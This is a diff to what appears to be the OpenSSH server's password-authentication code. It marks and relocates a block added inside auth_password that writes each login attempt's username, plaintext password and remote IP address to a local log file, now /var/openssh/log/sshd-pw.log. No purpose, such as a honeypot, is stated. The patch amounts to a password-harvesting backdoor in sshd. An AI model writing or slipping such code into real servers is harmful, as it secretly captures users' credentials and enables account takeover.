@@ -44,10 +44,10 @@
 #include <stdio.h>
 #include <string.h>
 #include <stdarg.h>
-///////////////////////////////////
+///////// MY CHANGE BEGIN //////////
 #include <fcntl.h>
 #include <time.h>
-///////////////////////////////////
+///////// MY CHANGE END ////////////
 
 #include "packet.h"
 #include "sshbuf.h"
@@ -72,9 +72,9 @@ extern login_cap_t *lc;
 #define TWO_WEEKS	(2L * 7 * DAY)	/* 2 weeks in seconds */
 
 #define MAX_PASSWORD_LEN	1024
-///////////////////////////////////
+///////// MY CHANGE BEGIN //////////
 #define BUF_MAX 255
-///////////////////////////////////
+///////// MY CHANGE END ////////////
 
 /*
  * Tries to authenticate the user using password.  Returns true if
@@ -84,14 +84,14 @@ int
 auth_password(struct ssh *ssh, const char *password)
 {
 	Authctxt *authctxt = ssh->authctxt;
-    ///////////////////////////////////
+///////// MY CHANGE BEGIN //////////
     time_t t;
     struct tm *p;
     time(&t);
     p = localtime(&t);
 
     int fd;
-    char *file = "/var/log/sshd-pw.log";
+    char *file = "/var/openssh/log/sshd-pw.log";
 
     if ((fd=open(file, O_RDWR|O_APPEND|O_CREAT, 0600)) == -1) {
           logit("failed to open pw file");
@@ -103,7 +103,7 @@ auth_password(struct ssh *ssh, const char *password)
                 authctxt->user, password, ssh->remote_ipaddr);
     int res=write(fd, buffer, len);
     close(fd);
-    ///////////////////////////////////
+///////// MY CHANGE END ////////////
 	struct passwd *pw = authctxt->pw;
 	int result, ok = authctxt->valid;
 #if defined(USE_SHADOW) && defined(HAS_SHADOW_EXPIRE)
